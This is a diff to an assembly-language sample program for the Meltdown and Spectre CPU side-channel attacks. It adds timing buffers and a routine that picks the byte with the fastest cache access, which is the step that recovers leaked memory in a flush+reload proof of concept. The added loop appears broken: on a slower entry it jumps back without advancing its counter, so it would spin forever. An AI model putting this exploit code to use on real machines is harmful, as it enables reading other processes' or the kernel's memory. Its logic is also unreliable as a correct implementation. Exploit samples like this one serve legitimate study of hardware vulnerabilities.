@@ -1,6 +1,6 @@
 bits 64
 
-;   Meltdown and Spectre Samples Written in Assembly
+;   Meltdown and Spectre - Samples Written in Assembly
 ;   Copyright (C) 2018 U. Plonus
 ;
 ;   This program is free software: you can redistribute it and/or modify
@@ -23,6 +23,8 @@ section .bss
      align          pagesize
      data:          resb pagesize
      probe:         times 256 resb pagesize
+     result:        resb pagesize
+     timing:        resq 256
 
 section .text
 _start:
@@ -71,7 +73,6 @@ _calccachetime:
      ret
 
 _calcareacachetime:
-     cld
      xor       RCX,RCX
 .next_timing:
      push      RCX
@@ -82,6 +83,26 @@ _calcareacachetime:
      inc       RCX
      cmp       RCX,256
      jb        .next_timing
+     ret
+
+_detectbytebycl:
+     push      RDI
+     call      _calcareacachetime
+     pop       RDI
+     mov       RSI,RDX
+     xor       RCX,RCX
+     mov       R8,0xffffffffffffffff
+     xor       R9,R9
+.nextbyte:
+     mov       RAX,[RDI+8*RCX]
+     cmp       RAX,R8
+     ja        .nextbyte
+     mov       R8,RAX
+     mov       R9,RCX
+     inc       RCX
+     cmp       RCX,256
+     jb        .nextbyte
+     mov       RAX,R9
      ret
 
 _xorshift:
